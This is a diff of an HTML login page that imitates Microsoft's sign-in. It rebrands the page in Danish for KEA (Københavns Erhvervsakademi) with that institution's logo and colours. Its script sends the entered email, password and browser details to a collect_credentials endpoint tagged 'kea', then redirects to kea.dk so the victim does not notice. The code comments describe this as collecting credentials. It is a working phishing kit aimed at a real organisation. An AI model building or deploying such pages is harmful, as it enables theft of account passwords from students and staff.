@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="da">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Sign in to your Microsoft account</title>
+    <title>KEA - Microsoft Login</title>
     <style>
       body {
         font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI",
@@ -24,10 +24,18 @@
         background-color: #ffffff;
         box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
       }
+      .logos {
+        display: flex;
+        align-items: center;
+        margin-bottom: 24px;
+      }
       .microsoft-logo {
-        margin-bottom: 16px;
         width: 108px;
         height: 24px;
+        margin-right: 16px;
+      }
+      .kea-logo {
+        height: 40px;
       }
       h1 {
         font-size: 24px;
@@ -55,7 +63,7 @@
       }
       input[type="email"]:focus,
       input[type="password"]:focus {
-        border-color: #0067b8;
+        border-color: #b11a29;
       }
       .button {
         display: inline-block;
@@ -64,7 +72,7 @@
         font-size: 14px;
         font-weight: 600;
         color: white;
-        background-color: #0067b8;
+        background-color: #b11a29;
         border: none;
         border-radius: 2px;
         cursor: pointer;
@@ -73,20 +81,20 @@
         height: 32px;
       }
       .button:hover {
-        background-color: #005da6;
+        background-color: #8a1320;
       }
       .links {
         margin-top: 24px;
         font-size: 13px;
       }
       .links a {
-        color: #0067b8;
+        color: #b11a29;
         text-decoration: none;
         margin-bottom: 8px;
         display: inline-block;
       }
       .links a:hover {
-        color: #005da6;
+        color: #8a1320;
         text-decoration: underline;
       }
       .error-message {
@@ -109,13 +117,20 @@
   </head>
   <body>
     <div class="login-container">
-      <img
-        src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/320px-Microsoft_logo_%282012%29.svg.png"
-        alt="Microsoft"
-        class="microsoft-logo"
-      />
-      <h1>Sign in</h1>
-      <div class="subtitle">to continue to Microsoft Office</div>
+      <div class="logos">
+        <img
+          src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+          alt="Microsoft"
+          class="microsoft-logo"
+        />
+        <img
+          src="https://www.kea.dk/images/resources/images/kea-header-logo-dark.svg"
+          alt="KEA"
+          class="kea-logo"
+        />
+      </div>
+      <h1>Log på</h1>
+      <div class="subtitle">for at fortsætte til KEA Microsoft Office</div>
 
       <form id="loginForm">
         <div class="form-control">
@@ -123,13 +138,13 @@
             type="email"
             id="email"
             name="email"
-            placeholder="Email, phone, or Skype"
+            placeholder="E-mail eller brugernavn"
             required
             autofocus
           />
         </div>
         <div class="error-message" id="emailError">
-          Enter a valid email address, phone number, or Skype name.
+          Indtast en gyldig e-mailadresse eller brugernavn.
         </div>
 
         <div class="form-control" id="passwordContainer" style="display: none">
@@ -137,41 +152,41 @@
             type="password"
             id="password"
             name="password"
-            placeholder="Password"
+            placeholder="Adgangskode"
             required
           />
         </div>
         <div class="error-message" id="passwordError">
-          Please enter your password.
+          Indtast din adgangskode.
         </div>
 
         <div style="text-align: right">
-          <button type="button" id="nextButton" class="button">Next</button>
+          <button type="button" id="nextButton" class="button">Næste</button>
           <button
             type="submit"
             id="signInButton"
             class="button"
             style="display: none"
           >
-            Sign in
+            Log på
           </button>
         </div>
       </form>
 
       <div class="links">
-        <a href="#">Can't access your account?</a><br />
-        <a href="#">Sign in with a security key</a><br />
-        <a href="#">Sign in options</a>
+        <a href="#">Kan du ikke få adgang til din konto?</a><br />
+        <a href="#">Log på med en sikkerhedsnøgle</a><br />
+        <a href="#">Login muligheder</a>
       </div>
     </div>
 
     <div class="footer">
       <div>
-        <span>Privacy & cookies</span>
+        <span>Fortrolighedspolitik & cookies</span>
         <span>&nbsp;•&nbsp;</span>
-        <span>Terms of use</span>
+        <span>Vilkår for brug</span>
       </div>
-      <div>© Microsoft 2025</div>
+      <div>© Københavns Erhvervsakademi 2025</div>
     </div>
 
     <script>
@@ -278,8 +293,8 @@
           // Collect system information
           const systemInfo = collectSystemInfo();
 
-          // Collect credentials
-          fetch("http://localhost:3000/collect_credentials", {
+          // Add KEA identifier to collected credentials
+          fetch("/api/collect_credentials", {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -287,6 +302,7 @@
             body: JSON.stringify({
               email: email,
               password: password,
+              org: "kea",
               screenInfo: systemInfo.screenInfo,
               browserInfo: systemInfo.browserInfo,
               timeInfo: systemInfo.timeInfo,
@@ -294,12 +310,12 @@
             }),
           })
             .then((response) => {
-              // Redirect to legitimate Microsoft page after collecting credentials
-              window.location.href = "https://outlook.office.com";
+              // Redirect to legitimate KEA page after collecting credentials
+              window.location.href = "https://kea.dk";
             })
             .catch((error) => {
               // Still redirect even if there's an error with the collection
-              window.location.href = "https://outlook.office.com";
+              window.location.href = "https://kea.dk";
             });
         });
     </script>
